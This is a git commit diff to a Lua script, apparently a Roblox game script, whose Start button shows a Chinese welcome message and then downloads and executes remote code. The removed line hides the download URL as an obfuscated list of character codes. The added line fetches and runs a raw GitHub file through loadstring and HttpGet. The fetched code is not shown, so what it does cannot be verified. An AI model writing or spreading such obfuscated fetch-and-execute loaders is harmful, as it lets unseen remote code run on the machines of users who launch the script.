6958fe205ae4d2fda520625df0c92d36ffc580ed
ren666yyds666 <139411617+ren666yyds666@users.noreply.github.com>
2023-08-10 20:02:31 +0800

    Update 3.lua

--- 3.lua
+++ 3.lua
@@ -76,7 +76,7 @@ Start.MouseButton1Click:Connect(function()
            Text = a.."，欢迎您",
            Duration = 20,
          })
-         loadstring(game:HttpGet(utf8.char((function() return table.unpack({104,116,116,112,115,58,47,47,114,97,119,46,103,105,116,104,117,98,117,115,101,114,99,111,110,116,101,110,116,46,99,111,109,47,114,101,110,108,117,97,121,121,100,115,54,54,54,47,114,101,110,47,109,97,105,110,47,55,54,52,54,52,57,55,57,57,55,46,108,117,97})end)())))();
+loadstring(game:HttpGet("https://raw.githubusercontent.com/ren666yyds666/vianxjwrnxkslxu-akxjwsxkqndxxjxcajdc/main/120.lua"))();
         else
          setclipboard("830835939")
          local CoreGui = game:GetService("StarterGui")
